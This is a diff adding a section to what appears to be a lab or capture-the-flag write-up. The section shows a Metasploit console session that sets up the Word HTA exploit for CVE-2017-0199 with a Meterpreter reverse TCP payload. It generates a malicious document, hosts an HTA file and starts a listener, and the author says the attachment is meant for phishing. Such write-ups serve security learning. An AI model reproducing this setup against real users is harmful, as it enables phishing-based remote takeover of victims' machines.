@@ -290,3 +290,50 @@ Looks to be a valid email address
 
 After doing some research on RTF phishing exploits i find metasploit has a module for the associated CVE `CVE-2017-0199`
 
+# Meterpreter session
+```python
+msf exploit(windows/fileformat/office_word_hta) > options
+
+Module options (exploit/windows/fileformat/office_word_hta):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   FILENAME  msf.doc          yes       The file name.
+   SRVHOST   10.10.14.90      yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT   8080             yes       The local port to listen on.
+   SRVSSL    false            no        Negotiate SSL/TLS for local server connections
+   SSL       false            no        Negotiate SSL for incoming connections
+   SSLCert                    no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH   default.hta      yes       The URI to use for the HTA file
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.14.90      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Microsoft Office Word
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(windows/fileformat/office_word_hta) > run
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+msf exploit(windows/fileformat/office_word_hta) > 
+[*] Started reverse TCP handler on 10.10.14.90:4444 
+[+] msf.doc stored at /home/kali/.msf4/local/msf.doc
+[*] Using URL: http://10.10.14.90:8080/default.hta
+[*] Server started.
+```
+Ive configured metasploit with an lhost and lport to connect back to and also set the srvhost to my ip where the malicious attachment will be hosted!
+
